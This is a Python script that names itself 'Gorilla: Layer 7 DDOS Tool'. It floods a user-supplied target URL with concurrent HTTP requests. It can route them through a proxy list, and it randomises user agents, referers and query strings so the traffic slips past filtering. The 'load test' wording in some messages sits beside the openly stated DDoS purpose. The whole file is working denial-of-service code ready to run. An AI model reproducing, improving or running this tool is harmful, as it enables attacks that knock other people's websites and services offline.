import asyncio
import aiohttp
import random
from urllib.parse import urlencode, urlparse
import argparse

# ------------------------
# Constants
# ------------------------
USER_AGENTS = [
    "Chrome/120.0.6099.200 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Safari/537.36",
    "Safari/605.1.15 (iPhone; CPU iPhone OS 16_4 like Mac OS X)",
    "Opera/98.0.4759.15 (Macintosh; Intel Mac OS X 13_2_1) Presto/2.12.388",
    "Brave/1.63.162 (Linux; Android 13; Pixel 7 Pro) Chrome/120.0.6099.201 Mobile",
    "Edge/121.0.2277.83 (Windows NT 11.0; Win64; x64)",
    "YaBrowser/23.9.3.765 (Linux; Android 12; Samsung Galaxy S22 Ultra) Chrome/119.0.6045.163 Mobile",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) rv:2025.09",
    "Safari/605.1.15 (Macintosh; Intel Mac OS X 14_0_1)",
    "Chrome/119.0.6045.105 (Linux; Android 11; Redmi Note 10 Pro) Mobile",
    "Opera/76.0.4017.123 (Windows NT 6.1; Win64; x64)",
    "Brave/1.62.153 (Macintosh; Intel Mac OS X 13_5_2) Chrome/119.0.6045.159",
    "Edge/120.0.2210.121 (iPad; CPU OS 17_1 like Mac OS X)",
    "YaBrowser/23.7.1.1000 (Windows NT 10.0; Win64; x64) Chrome/118.0.5993.117",
    "Mozilla/6.1 (Linux; Fedora; x86_64) Custom/2025.01"
]

LANGUAGES = ["en-US,en;q=0.9", "tr-TR,tr;q=0.8,en-US;q=0.7"]

REFERERS = [
    "https://google.com/", "https://bing.com/", "https://yahoo.com/",
    "https://duckduckgo.com/", "https://example.com/", "https://github.com/",
    "https://stackoverflow.com/", "https://reddit.com/", "https://twitter.com/",
    "https://facebook.com/", "https://linkedin.com/", "https://medium.com/",
    "https://cnn.com/", "https://bbc.com/", "https://nytimes.com/",
    "https://theverge.com/", "https://techcrunch.com/", "https://wikipedia.org/",
    "https://quora.com/", "https://instagram.com/", "https://youtube.com/",
    "https://pinterest.com/"
]

DEFAULT_TOTAL = 2000
DEFAULT_CONCURRENCY = 20
DEFAULT_TIMEOUT = 10

# ------------------------
# Gorilla ASCII Art
# ------------------------
GORILLA_ART = r"""

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢾⣿⣿⣿⣿⣄⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣴⣿⣿⣶⣄⠹⣿⣿⣿⡟⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⡆⢹⣿⣿⣿⣷⡀⠀
⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⣀⣀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⢿⣿⣿⣿⡇⠀
⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⢸⣿⣿⠟⠁⠀
⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠹⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⢻⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀
⠀⠀⠀⣿⣿⣿⣿⣿⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⢿⣿⣿⣿⣿⡄⠀⠀⠀⠀
⠀⠀⢀⣿⣿⣿⣿⣿⡟⢀⣿⣿⣿⣿⣿⣿⡿⠟⢁⡄⠸⣿⣿⣿⣿⣷⠀⠀⠀⠀
⠀⠀⣼⣿⣿⣿⣿⠏⠀⣈⡙⠛⢛⠋⠉⠁⠀⣸⣿⣿⠀⢻⣿⣿⣿⣿⡆⠀⠀⠀
⠀⢠⣿⣿⣿⣿⣟⠀⠀⢿⣿⣿⣿⡄⠀⠀⢀⣿⣿⡟⠃⣸⣿⣿⣿⣿⡇⠀⠀⠀
⠀⠘⠛⠛⠛⠛⠛⠛⠀⠘⠛⠛⠛⠛⠓⠀⠛⠛⠛⠃⠘⠛⠛⠛⠛⠛⠃⠀⠀⠀
"""

# ------------------------
# Load Proxy List
# ------------------------
def load_proxies(path: str):
    proxies = []
    if not path:
        return proxies
    try:
        with open(path, "r") as f:
            for line in f:
                p = line.strip()
                if p:
                    proxies.append(p)
    except FileNotFoundError:
        print(f"[!] Proxy file not found: {path}. Continuing without proxies.")
    return proxies

# ------------------------
# Async Request Function
# ------------------------
async def fetch(session: aiohttp.ClientSession, url: str, sem: asyncio.Semaphore, req_id: int, proxy: str | None = None):
    async with sem:
        params = {
            "q": f"random{random.randint(0,999)}",
            "page": random.randint(1,50),
            "sort": random.choice(["asc","desc"])
        }
        full_url = f"{url}?{urlencode(params)}"
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept-Language": random.choice(LANGUAGES),
            "Referer": random.choice(REFERERS),
            "X-Request-ID": str(random.randint(1000,9999))
        }
        proxy = f"http://{proxy}" if proxy and not proxy.startswith("http") else proxy
        await asyncio.sleep(random.uniform(0,0.05))
        try:
            async with session.get(full_url, headers=headers, timeout=DEFAULT_TIMEOUT, proxy=proxy) as resp:
                text = await resp.text()
                print(f"[{req_id}] Status: {resp.status} | Content Length: {len(text)}")
        except aiohttp.ClientConnectorError:
                print(f"\n[!] Connection error: Target is unreachable ({full_url}). Skipping...")
                return  # sadece bu task’i bitir, program durmasın
        except Exception as e:
                print(f"[{req_id}] Error: {type(e).__name__} | {e}")


# ------------------------
# Run Load Test
# ------------------------
async def run_test(target: str, total: int, concurrency: int, proxies: list[str]):
    sem = asyncio.Semaphore(concurrency)
    connector = aiohttp.TCPConnector(limit=concurrency)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        for i in range(total):
            proxy = random.choice(proxies) if proxies else None
            tasks.append(asyncio.create_task(fetch(session, target, sem, i+1, proxy)))
        await asyncio.gather(*tasks)

# ------------------------
# Main
# ------------------------
def main():
    print(GORILLA_ART)
    print(" Gorilla DDOS Tool \n")

    parser = argparse.ArgumentParser(
        description="Gorilla: Layer 7 DDOS Tool"
    )
    parser.add_argument("-t", "--target", required=True, help="Target URL to test (e.g. https://example.com)")
    parser.add_argument("-n", "--total", type=int, default=DEFAULT_TOTAL, help="Total number of requests to send")
    parser.add_argument("-c", "--concurrency", type=int, default=DEFAULT_CONCURRENCY, help="Number of concurrent requests")
    parser.add_argument("-p", "--proxies", help="Optional proxy file path (one per line)")

    args = parser.parse_args()

    proxies = load_proxies(args.proxies)

    print(f"Starting test: target={args.target}, total={args.total}, concurrency={args.concurrency}\n")

    try:
        asyncio.run(run_test(args.target, args.total, args.concurrency, proxies))
    except KeyboardInterrupt:
        print("\n[!] Test interrupted by user. Exiting gracefully...")

    print("\nTest completed successfully!")

# ------------------------
# Entry Point
# ------------------------
if __name__ == "__main__":
    main()
